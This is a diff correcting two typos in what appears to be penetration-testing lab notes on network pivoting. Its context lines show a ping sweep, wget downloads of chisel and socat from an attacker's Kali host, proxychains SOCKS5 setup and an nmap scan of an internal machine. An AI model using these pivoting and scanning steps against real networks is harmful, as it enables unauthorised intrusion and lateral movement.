@@ -132,7 +132,7 @@ for i in $(seq 254); do ping 20.20.20.$i -c1 -W1 & done | grep from
 ```
 # Pivot 1
 
-Get chisel and sockat from kali
+Get chisel and socat from kali
 ``` sh
 wget http://10.10.10.1/chisel
 wget http://10.10.10.1:8000/socat
@@ -156,7 +156,7 @@ tail -n 1 /etc/proxychains4.conf
 socks5  127.0.0.1 1080
 ```
 # Trust
-## Porsts scanning
+## Ports scanning
 
 ``` sh
 proxychains nmap -sT -Pn -n 20.20.20.3
